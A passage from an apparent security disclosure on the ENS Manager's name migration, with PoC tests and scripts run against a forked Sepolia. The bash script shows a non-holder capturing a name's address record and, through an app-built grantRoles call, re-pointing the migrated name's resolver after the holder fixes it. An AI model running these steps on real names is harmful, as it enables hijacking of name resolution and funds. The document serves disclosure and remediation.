  realityproof.eth  testwrapper.eth  visionfoundation.eth  divi.eth  safe-test.eth  prime.eth
```

### F. What the user is shown

```bash
grep -rn "managerAddress" apps/manager/src --include="*.tsx"
### apps/manager/src/features/migration/components/SelectNamesStep.test.tsx:30:  managerAddress: null,
### (a test fixture — no component renders it)

grep -rni "manager restoration\|existing managers" apps/manager/src --include="*.tsx"
### components/GameStep.tsx:137                      `Approve manager restoration in your wallet…`
### components/WalletConfirmationStepsDialog.tsx:84  <Trans>Approve manager restoration</Trans>
### components/WalletConfirmationStepsDialog.tsx:87  <Trans>Restore the existing managers for your names.</Trans>

grep -rn "revokeRoles" apps/manager/src
### (no output)

grep -rn "ensLegacyRegistry" apps/manager/src/features/migration packages/migration/src
### (no output — the grantee is never re-read on chain; the Explorer's
###  apps/portal/src/features/ownership/components/V1NameManagerRecord.tsx does read it)
```

Rendered, not only grepped:

```bash
pnpm --filter manager exec vitest run \
  src/features/migration/components/__poc_migration_ui_disclosure.test.tsx --silent=false --reporter=verbose
```

```
select-step mentions the manager address: false
dialog copy: Approve manager restoration | Restore the existing managers for your names.
dialog mentions the manager address: false
Tests  2 passed (2)
```

### G. It is in the deployed build

`app.ens.dev`, fetched 2026-08-19. The route chunks are lazy; the two below are referenced from the live entry chunk `assets/index-CcNccUE2.js`. `grep -a` is required—the payload carries raw non-UTF8 bytes, and without it grep treats the file as binary and prints nothing.

```bash
curl -s https://app.ens.dev/ -o app.html
grep -ao 'assets/index-[A-Za-z0-9_-]*\.js' app.html | sort -u        # index-CcNccUE2.js
curl -s https://app.ens.dev/assets/index-CcNccUE2.js | grep -ao 'migration-CmgvIteB\|useEligibleV1Names-B5kQt4VR'
curl -s https://app.ens.dev/assets/migration-CmgvIteB.js -o m.js
grep -ao '1n<<24n[^;]\{0,120\}' m.js | head -1
grep -ao 'manager-role-grant' m.js | head -1
```

```js
// assets/migration-CmgvIteB.js
Tt=1n<<24n,
Et=e=>{
  if(!e.managerAddress) throw Error(`No manager address for ${e.domain.name}`);
  let t=V(e.label);
  return {to:N.ETHRegistry, data:I({abi:ge,functionName:`grantRoles`,args:[t,Tt,e.managerAddress]}), value:0n}
}
… managerAddress&&(h.push({phase:`manager-role-grant`,name:f,names:[f],call:Et(i)}), …

// assets/useEligibleV1Names-B5kQt4VR.js
let c=Y(e.owner.id), l=c&&c.toLowerCase()!==t.id.toLowerCase()?c:null;   … managerAddress:l
Q=e=>{ … r&&!Cn(r) ? `keep-v1` : `to-owned-permres`}
Sn=[F({chain:J,contract:`ensPublicResolver`}),`0x8FADE66B…B7dD`,`0x640294a2…170d`,`0xc30ba2bd…8e10`,
    `0x1da02271…6aB5`,`0xDaaF96c3…dfBA`,`0x4976fb03…Ba41`,`0x231b0Ee1…8E63`,`0xF2910098…AC15`]
Cn=e=>e?Sn.some(t=>f(t,e)):!1
```

### H. The roles-table figures quoted above

```bash
grep -n "MAX_EVENTS" apps/portal/src/features/roles/hooks/useNameRoleAccounts.ts
### 50:const MAX_EVENTS = 1000
### 89:      first: MAX_EVENTS,
grep -n "selectedAccount" apps/portal/src/features/roles/components/RolesSidebar.tsx | head -3
### 84:  const selectedAccount = row?.original.account
```

Event count, paginated with the `blockNumber_lt` cursor the app's own `useRoleHistory` uses:

```
staging-graphql.ens.dev  EACRolesChanged on 0xBDC85dD5…F0E2 : 2559   (3 pages, last page short)
graphql.ens.dev          same query, other deployment       : 0      (control — endpoint pairing)
```

A `skip`-based sweep of the same endpoint is not a valid instrument: `skip: 0`, `skip: 1000` and `skip: 2000` all return the same first rows (`0xbefc0836…` at block 11523394), so `skip` is ignored and any total taken that way is meaningless. Stated because it silently inflated an earlier count of mine to "≥21,000".

### Files

| file                                     | what it does                                                                                   |
| ---------------------------------------- | ---------------------------------------------------------------------------------------------- |
| `__poc_live_both_arms.test.ts`           | B — live rows → app code → grant calldata + kept resolver, 4 names, + control                  |
| `poc_migration_record_capture.sh`        | C — record capture → migration → frozen record → grant → the repoint loop → the working remedy |
| `poc_v1_stale_controller.sh`             | D — a plain sale leaves the manager behind                                                     |
| `poc_seller_plants_backdoor.sh`          | D — the seller plants a burner before selling                                                  |
| `poc_operator_can_grant.sh`              | D — the approval step is the authority the grant needs                                         |
| `poc_thirdparty_roles_survive.sh`        | D — the grant outlives later transfers of the name                                             |
| `poc_migration_arms_population.mjs`      | E — the exhaustive live population, both arms, one denominator                                 |
| `__poc_migration_ui_disclosure.test.tsx` | F — the rendered UI never carries the address                                                  |
| `__poc_keepv1_resolver.test.ts`          | unit: the resolver strategy, with the two allowlist controls                                   |
| `poc_helper_path_full.sh`                | reachability: the same chain through the HCA → `MigrationHelper` path                          |

### `__poc_live_both_arms.test.ts`

```ts
/**
 * LIVE PROBE — both migration arms, on names that are in this state on Sepolia
 * RIGHT NOW, driven through the Manager's own code with the app's own document.
 * Place at apps/manager/src/features/migration/service/__poc_live_both_arms.test.ts
 */
import { type Address, decodeFunctionData, type Hex } from 'viem'
import { sepolia } from 'viem/chains'
import { describe, expect, it } from 'vitest'
import { ETH_REGISTRY_V2_ABI } from '../contracts/abis'
import { V2_CONTRACTS } from '../contracts/addresses'
import { buildAtomicMigrationBatches } from './buildAtomicMigrationBatches'
import { classifyName } from './classifyNames'
import type { DirectMigrationRoute } from './directMigrationRoutes'
import type { V1Domain } from './v1SubgraphClient'

const NAMES = (
  process.env.POC_NAMES ?? 'kiln.eth,turnkey.eth,web3labs.eth,testdeployment.eth'
).split(',')
const HCA: Address = '0x00000000000000000000000000000000000000a1'
const OWNED_PERMRES: Address = '0x00000000000000000000000000000000000000d1'
const ROLE_SET_RESOLVER = 1n << 24n

const DOC = `
query getNamesForAddress($whereFilter: Domain_filter) {
  domains(first: 5, where: $whereFilter) {
    id labelName labelhash name
    resolver { address }
    owner { id }
    registrant { id }
    wrappedOwner { id }
    parent { name wrappedDomain { fuses } }
    registration { expiryDate }
    wrappedDomain { expiryDate fuses }
  }
}`

const fetchLive = async (name: string): Promise<V1Domain> => {
  const res = await fetch('https://v1-graphql.ens.dev/subgraph', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      query: DOC,
      variables: { whereFilter: { name } },
      operationName: 'getNamesForAddress',
    }),
  })
  const json = (await res.json()) as { data: { domains: V1Domain[] } }
  const domain = json.data.domains[0]
  if (!domain) throw new Error(`live row not found: ${name}`)
  return domain
}

const planFor = async (domain: V1Domain, migrator: Address) => {
  const classified = classifyName(domain, migrator)
  if (classified?.type !== 'classified')
    throw new Error(`not classified: ${JSON.stringify(classified)}`)
  const routes: ReadonlyMap<string, DirectMigrationRoute> = new Map([
    [
      domain.name,
      {
        name: domain.name,
        receiver: V2_CONTRACTS.UnlockedMigrationController,
        parentDependency: null,
        expectedWrapperRegistry: null,
        receiverReadiness: 'migration-controller',
      } satisfies DirectMigrationRoute,
    ],
  ])
  const plan = await buildAtomicMigrationBatches({
    chainId: sepolia.id,
    hca: HCA,
    wallet: migrator,
    profiles: new Map(),
    defaultResolver: OWNED_PERMRES,
    resolverDeployed: true,
    walletCoAdminGranted: true,
    maxOuterGas: 30_000_000n,
    estimateOuterGas: () => 100_000n,
    classified: [classified.name],
    directRoutes: routes,
  })
  const grants: {
    data: Hex
    phase: string
    to: Address
    resource: string
    roles: string
    account: Address
    inSignedCalldata: boolean
  }[] = []
  for (const batch of plan.batches) {
    const outer = (batch.outerCall.data as Hex).toLowerCase()
    for (const exec of batch.innerExecutions) {
      try {
        const d = decodeFunctionData({
          abi: ETH_REGISTRY_V2_ABI,
          data: exec.call.data as Hex,
        })
        if (d.functionName !== 'grantRoles') continue
        const [resource, roles, account] = d.args as [bigint, bigint, Address]
        grants.push({
          data: exec.call.data as Hex,
          phase: exec.phase,
          to: exec.call.to,
          resource: resource.toString(),
          roles: roles.toString(),
          account,
          inSignedCalldata: outer.includes(
            (exec.call.data as Hex).slice(2).toLowerCase(),
          ),
        })
      } catch {}
    }
  }
  return {
    strategy: classified.name.resolverStrategy,
    v1Resolver: classified.name.v1ResolverAddress,
    managerAddress: classified.name.managerAddress,
    migrationDataResolvers: plan.batches.flatMap((b) =>
      b.nameExecutions.map((n) => n.migrationData.resolver),
    ),
    grants,
  }
}

describe('live Sepolia: both migration arms on real names', () => {
  for (const name of NAMES) {
    it(`${name}: grant to the v1 registry owner + its resolver carried into v2`, async () => {
      const domain = await fetchLive(name)
      const migrator = domain.registrant!.id as Address
      const r = await planFor(domain, migrator)
      console.log(
        `\n${name}\n  registrant (migrator) : ${migrator}` +
          `\n  v1 registry owner     : ${domain.owner.id}` +
          `\n  v1 resolver           : ${r.v1Resolver}` +
          `\n  resolverStrategy      : ${r.strategy}` +
          `\n  migrationData.resolver: ${JSON.stringify(r.migrationDataResolvers)}` +
          `\n  managerAddress        : ${r.managerAddress}` +
          `\n  grant                 : ${JSON.stringify(r.grants)}`,
      )
      // arm A
      expect(r.managerAddress?.toLowerCase()).toBe(domain.owner.id.toLowerCase())
      expect(r.managerAddress?.toLowerCase()).not.toBe(migrator.toLowerCase())
      const g = r.grants.find(
        (x) => x.account.toLowerCase() === r.managerAddress?.toLowerCase(),
      )
      expect(g).toBeDefined()
      expect(g?.roles).toBe(ROLE_SET_RESOLVER.toString())
      expect(g?.to).toBe(V2_CONTRACTS.ETHRegistry)
      expect(g?.phase).toBe('manager-role-grant')
      expect(g?.inSignedCalldata).toBe(true)
      // arm B
      expect(r.strategy).toBe('keep-v1')
      expect(r.migrationDataResolvers.map((a) => a.toLowerCase())).toContain(
        r.v1Resolver!.toLowerCase(),
      )
    }, 30_000)
  }

  it('CONTROL: registry owner == registrant -> no grant, resolver still kept', async () => {
    const domain = await fetchLive(NAMES[0]!)
    const migrator = domain.registrant!.id as Address
    const r = await planFor({ ...domain, owner: { id: migrator } }, migrator)
    console.log('\ncontrol managerAddress:', r.managerAddress, 'grants:', r.grants.length)
    expect(r.managerAddress).toBeNull()
    expect(r.grants).toHaveLength(0)
  }, 30_000)
})
```

### `poc_migration_record_capture.sh`

```bash
#!/usr/bin/env bash
### One real live-Sepolia name, nothing planted. The party that is NOT the holder
### writes the name's address record, the holder migrates through the Manager's own
### plan, and the migrated v2 name carries both that record — which the holder
### cannot overwrite — and grantRoles(ROLE_SET_RESOLVER, that third party), so the
### holder's only remedy is undone at will.
### Run against `anvil --fork-url <sepolia>` on :8545.
set -uo pipefail
R=${R:-http://127.0.0.1:8545}
REGISTRY=0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e     # v1 ENS registry
BASEREG=0x57f1887a8BF19b14fC0dF6Fd9B2acc9Af147eA85      # v1 BaseRegistrar (.eth)
UMC=0x2FCf83232b93bD29C59dB18AaA1D4b62e9f9FC73          # v2 UnlockedMigrationController
REGY=0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2         # v2 ETHRegistry
UR=0xeEeEEEeE14D718C2B47D9923Deab1335E144EeEe           # UniversalResolver answering on Sepolia
OWNRES=0x00000000000000000000000000000000000000D1       # stand-in for the holder's own resolver
ZERO=0x0000000000000000000000000000000000000000
HCA=0x00000000000000000000000000000000000Fa9e0          # stand-in for the migrator's HCA
NOROLE=0x0000000000000000000000000000000000C0FFEE       # control: holds nothing
ATTACKER=0x000000000000000000000000000000000000dEaD

NAME=${1:-kiln.eth}; LABEL=${NAME%%.eth}
APP_CALLDATA=${2:-}
NODE=$(cast namehash "$NAME"); LH=$(cast keccak "$LABEL"); ID=$(cast to-dec "$LH")
RES=$(python3 -c "h=int('$LH',16); print(hex(h ^ (h & 0xffffffff)))")
tokid() { cast call $REGY 'getTokenId(uint256)(uint256)' "$LH" --rpc-url $R | awk '{print $1}'; }
send() { cast send --unlocked --from "$1" --rpc-url $R "${@:2}" --json 2>&1 | python3 -c 'import sys,json
s=sys.stdin.read()
try: print("   -> status",json.loads(s).get("status"))
except Exception: print("   -> REVERT:"," ".join(s.split())[:150])'; }
call() { cast call --rpc-url $R "$@" 2>&1 | head -1; }
dnsname() { python3 -c "
import sys
out=b''
for lab in sys.argv[1].split('.'):
    b=lab.encode(); out+=bytes([len(b)])+b
print('0x'+(out+b'\\x00').hex())" "$1"; }
ur() { cast call $UR 'resolve(bytes,bytes)(bytes,address)' "$(dnsname "$NAME")" \
        "$(cast calldata 'addr(bytes32)' $NODE)" --rpc-url $R 2>&1 | tr '\n' ' ' | \
        python3 -c "
import sys
t=sys.stdin.read().split()
if len(t)>=2 and t[0].startswith('0x') and len(t[0])>=66:
    print('addr=0x'+t[0][-40:],' via resolver',t[1])
else: print('REVERT/other:',' '.join(t)[:90])"; }

cast rpc anvil_autoImpersonateAccount true --rpc-url $R >/dev/null
CTRL=$(call $REGISTRY 'owner(bytes32)(address)' $NODE)
HOLDER=$(call $BASEREG 'ownerOf(uint256)(address)' "$ID")
V1RES=$(call $REGISTRY 'resolver(bytes32)(address)' $NODE)
for a in "$CTRL" "$HOLDER" $HCA $NOROLE; do cast rpc anvil_setBalance "$a" 0xde0b6b3a7640000 --rpc-url $R >/dev/null; done

echo "== 0. read off the fork, i.e. live Sepolia state =="
echo "   name                        = $NAME"
echo "   ERC-721 registrant (holder) = $HOLDER"
echo "   v1 registry owner (3rd pty) = $CTRL"
echo "   v1 resolver                 = $V1RES"
echo "   addr(60) today              = $(call $V1RES 'addr(bytes32)(address)' $NODE)"
echo "   v2 status (1 = migratable)  = $(call $REGY 'getStatus(uint256)(uint8)' "$(tokid)")"
echo "   a client resolving $NAME: $(ur)"
echo
echo "== 1. the third party writes the name's address record (they can, today) =="
send "$CTRL" "$V1RES" 'setAddr(bytes32,address)' $NODE $ATTACKER
echo "   addr(60) now                = $(call $V1RES 'addr(bytes32)(address)' $NODE)"
echo "   CONTROL: the holder attempts the same write:"
send "$HOLDER" "$V1RES" 'setAddr(bytes32,address)' $NODE "$HOLDER"
echo "   CONTROL: an unrelated address attempts it:"
send $NOROLE "$V1RES" 'setAddr(bytes32,address)' $NODE $NOROLE
echo "   addr(60) still              = $(call $V1RES 'addr(bytes32)(address)' $NODE)"
echo "   a client resolving $NAME: $(ur)   <- unchanged, the v2 side still bridges"
echo
echo "== 2. the holder migrates. The resolver in the migration data is the app's own"
echo "      keep-v1 value for this name ($V1RES) =="
DATA=$(cast abi-encode 'f((string,address,address,address))' "($LABEL,$HOLDER,$ZERO,$V1RES)")
send "$HOLDER" $BASEREG 'safeTransferFrom(address,address,uint256,bytes)' "$HOLDER" $UMC "$ID" "$DATA"
echo "   v2 owner                    = $(call $REGY 'ownerOf(uint256)(address)' "$(tokid)")"
echo "   v2 resolver                 = $(call $REGY 'getResolver(string)(address)' "$LABEL")"
echo "   what the name resolves to   = $(call "$V1RES" 'addr(bytes32)(address)' $NODE)"
echo "   a client resolving $NAME: $(ur)"
echo
echo "== 3. who holds v1 authority now? =="
echo "   v1 ERC-721 owner            = $(call $BASEREG 'ownerOf(uint256)(address)' "$ID")"
echo "   v1 registry owner           = $(call $REGISTRY 'owner(bytes32)(address)' $NODE)"
echo "   the holder tries to correct the record on the resolver their name now uses:"
send "$HOLDER" "$V1RES" 'setAddr(bytes32,address)' $NODE "$HOLDER"
echo "   the holder tries the v1 remedy reclaim():"
send "$HOLDER" $BASEREG 'reclaim(uint256,address)' "$ID" "$HOLDER"
echo "   addr(60) still              = $(call "$V1RES" 'addr(bytes32)(address)' $NODE)"
echo
if [ -n "$APP_CALLDATA" ]; then
echo "== 4. the migration batch's manager-role-grant, byte-for-byte as the app builds it =="
send "$HOLDER" $REGY 'setApprovalForAll(address,bool)' $HCA true
send $HCA $REGY "$APP_CALLDATA"
echo "   third party holds ROLE_SET_RESOLVER: $(call $REGY 'hasRoles(uint256,uint256,address)(bool)' "$RES" 16777216 "$CTRL")"
echo
echo "== 5. the holder's only remedy, and what happens to it =="
send "$HOLDER" $REGY 'setResolver(uint256,address)' "$(tokid)" $OWNRES
echo "   v2 resolver = $(call $REGY 'getResolver(string)(address)' "$LABEL")   <- fixed"
echo "   the third party uses the grant:"
send "$CTRL" $REGY 'setResolver(uint256,address)' "$(tokid)" "$V1RES"
echo "   v2 resolver = $(call $REGY 'getResolver(string)(address)' "$LABEL")   <- captured again"
echo "   a client resolving $NAME: $(ur)"
echo "   CONTROL: an address with no role attempts the same repoint:"
send $NOROLE $REGY 'setResolver(uint256,address)' "$(tokid)" $ZERO
echo
echo "== 6. the only effective remedy — two steps, in an app that is not the Manager =="
send "$HOLDER" $REGY 'revokeRoles(uint256,uint256,address)' "$RES" 16777216 "$CTRL"
echo "   third party holds ROLE_SET_RESOLVER: $(call $REGY 'hasRoles(uint256,uint256,address)(bool)' "$RES" 16777216 "$CTRL")"
send "$CTRL" $REGY 'setResolver(uint256,address)' "$(tokid)" "$V1RES"
send "$HOLDER" $REGY 'setResolver(uint256,address)' "$(tokid)" $OWNRES
echo "   v2 resolver = $(call $REGY 'getResolver(string)(address)' "$LABEL")"
fi
```

### `poc_migration_arms_population.mjs`

```js
/**
 * Exhaustive population sweep, both arms, ONE denominator.
 * Mirrors the Manager's own document (v1SubgraphClient.ts) and classifyName().
 * Runs to exhaustion (no page cap) with an id_gt cursor + a positive control.
 * Run: node poc_migration_arms_population.mjs
 */
const SUBGRAPH = 'https://v1-graphql.ens.dev/subgraph'
const ETH_NODE = '0x93cdeb708b7545dc668eb9280176169d1c33cfd8ed6f04690a0bcc88a93fc4ae'
const NAMEWRAPPER = '0x0635513f179d50a207757e05759cbd106d7dfce8'
const ZERO = '0x0000000000000000000000000000000000000000'
const now = Math.floor(Date.now() / 1000)
const KNOWN = [
  // packages/migration/src/contracts/knownResolvers.ts, resolved:
  // entry 0 is getChainContractAddress({chain: sepoliaWithEns, contract:'ensPublicResolver'})
  '0x5239a812ec9a62f46dbb5de8f346c8efe7553a9f',
  '0x8fade66b79cc9f707ab26799354482eb93a5b7dd',
  '0x640294a2b2d87e7f522db3e3e3e876764bce170d',
  '0xc30ba2bd21583605d815826c3807e8224e398e10',
  '0x1da022710df5002339274aadee8d58218e9d6ab5',
  '0xdaaf96c344f63131acadd0ea35170e7892d3dfba',
  '0x4976fb03c32e5b8cfe2b6ccb31c09ba78ebaba41',
  '0x231b0ee14048e9dccd1d247744d114a4eb5e8e63',
  '0xf29100983e058b709f3d539b0c765937b804ac15',
]
const Q = `query P($whereFilter: Domain_filter){ domains(orderBy:id, orderDirection:asc, first:1000, where:$whereFilter){
  id labelName name resolver{address} owner{id} registrant{id} wrappedOwner{id}
  registration{expiryDate} wrappedDomain{expiryDate fuses} } }`

const page = async (cursor) => {
  const and = [
    { parent: ETH_NODE },
    { or: [{ expiryDate_gt: String(now) }, { expiryDate: null }] },
    { or: [{ owner_not: ZERO }, { resolver_not: null }, { and: [{ registrant_not: ZERO }, { registrant_not: null }] }] },
  ]
  if (cursor) and.push({ id_gt: cursor })
  const r = await fetch(SUBGRAPH, {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ query: Q, variables: { whereFilter: { and } } }),
  })
  const j = await r.json()
  if (j.errors) throw new Error(JSON.stringify(j.errors).slice(0, 300))
  return j.data.domains
}

let cursor, pages = 0, scanned = 0, lastPageSize = null
const eligible = [], grant = [], keepv1 = [], both = []
let sawControl = false
for (;;) {
  const rows = await page(cursor)
  pages++
  lastPageSize = rows.length
  if (!rows.length) break
  scanned += rows.length
  for (const d of rows) {
    if (d.labelName === 'testdeployment') sawControl = true
    const reg = d.registrant?.id?.toLowerCase()
    const own = d.owner?.id?.toLowerCase()
    if (!reg || reg === NAMEWRAPPER) continue                       // wrapped -> managerAddress null
    const wd = d.wrappedDomain
    const wrappedOwnerMatches = d.wrappedOwner?.id?.toLowerCase() === reg
    if (wd && (Number(wd.expiryDate) > now || wrappedOwnerMatches)) continue
    if (!d.labelName || /\[[0-9a-f]{64}\]/i.test(d.name)) continue  // unknown-label
    const exp = d.registration?.expiryDate
    if (!exp || Number(exp) <= now) continue                        // expired-registration
    eligible.push(d)
    const res = d.resolver?.address?.toLowerCase() || null
    const isKeepV1 = !!res && !KNOWN.includes(res)
    const isGrant = !!own && own !== reg
    if (isGrant) grant.push(d)
    if (isKeepV1) keepv1.push(d)
    if (isGrant && isKeepV1) both.push(d)
  }
  cursor = rows[rows.length - 1].id
  if (rows.length < 1000) break
}
const pct = (n, d) => (d ? ((100 * n) / d).toFixed(1) + '%' : '-')
console.log(`endpoint            : ${SUBGRAPH}`)
console.log(`pages fetched       : ${pages}  (last page ${lastPageSize} rows -> exhausted: ${lastPageSize < 1000})`)
console.log(`rows scanned        : ${scanned}`)
console.log(`positive control (testdeployment present in sweep): ${sawControl}`)
console.log(`eligible                                  : ${eligible.length}`)
console.log(`  arm A  registry owner != registrant      : ${grant.length}  (${pct(grant.length, eligible.length)})`)
console.log(`  arm B  resolver not allowlisted (keep-v1): ${keepv1.length}  (${pct(keepv1.length, eligible.length)})`)
console.log(`  BOTH arms on one name                    : ${both.length}  (${pct(both.length, eligible.length)})`)
const hist = new Map()
for (const d of eligible) { const r = d.resolver?.address?.toLowerCase() || 'none'; hist.set(r, (hist.get(r) || 0) + 1) }
for (const [r, n] of [...hist].sort((a, b) => b[1] - a[1]).slice(0, 8))
  console.log(`  ${r}  ${String(n).padStart(5)}  ${KNOWN.includes(r) ? 'allowlisted' : r === 'none' ? 'no resolver' : 'NOT allowlisted -> keep-v1'}`)
for (const d of grant.slice(0, 25))
  console.log(`  ${d.name.padEnd(28)} registrant=${d.registrant.id.slice(0, 10)} owner=${d.owner.id.slice(0, 10)} resolver=${(d.resolver?.address || 'none').slice(0, 10)}`)
```

### Reachability note on the HCA path

Section C pushes the ERC-721 straight to `UnlockedMigrationController`, which is the migration's core step. The same chain also runs through the app's own route—the registrant's HCA calling `MigrationHelper.migrate(...)`. Run on `testdeployment.eth` (registrant `0x9f701e55…F050`, v1 registry owner `0xAcEA33E3…D05B`), fork block 11523459:

```bash
bash poc_helper_path_full.sh testdeployment.eth
```

```
1) deploy the registrant's HCA at the address the app computes  -> status 0x1
   hca = 0x872fb768cC956F80677f9bE4D8928A24C5DEa0f5   owner() = 0x9f701e55…F050
2) the app's approvals: BaseRegistrar -> MigrationHelper, ETHRegistry -> HCA  -> 0x1 / 0x1
3) HCA -> MigrationHelper.migrate([{label,owner,subregistry,resolver}])       -> status 0x1
   v2 owner    = 0x9f701e556c4D01e6cB2A27e0Dc48F6a21F8Ff050
   v2 resolver = 0x5239A812ec9A62F46dbb5de8f346C8eFe7553A9f
   controller holds SET_RESOLVER: false
4) the HCA runs the batch's manager-role-grant (the app's exact calldata)     -> status 0x1
   controller holds SET_RESOLVER: true
5) the third party repoints the registrant's migrated name                    -> status 0x1
   v2 resolver = 0x000000000000000000000000000000000000bAaD
   v2 owner    = 0x9f701e556c4D01e6cB2A27e0Dc48F6a21F8Ff050   <- unchanged
```

Steps 1–3 also complete for `kiln.eth` (`status 0x1`, v2 owner = its registrant), which is the reachability answer for the subject of section C; that script's step 4 carries `testdeployment`'s grant bytes, so run it on `testdeployment.eth` for the full five steps.

`MigrationHelper` does not reject a name whose v1 registry owner is not the registrant—step 3 is that answer. One deviation, stated: a bare `VerifiableFactory` proxy used as the HCA also needed `BaseRegistrar.setApprovalForAll(hca, true)`, which the app does not perform; without it the helper reverts `NotApprovedOperator` (`0x1cf8fdfe`). Production HCAs are certified through the same factory and migrated names exist on live Sepolia, so that path satisfies the helper another way. Steps 4 and 5 are unaffected.
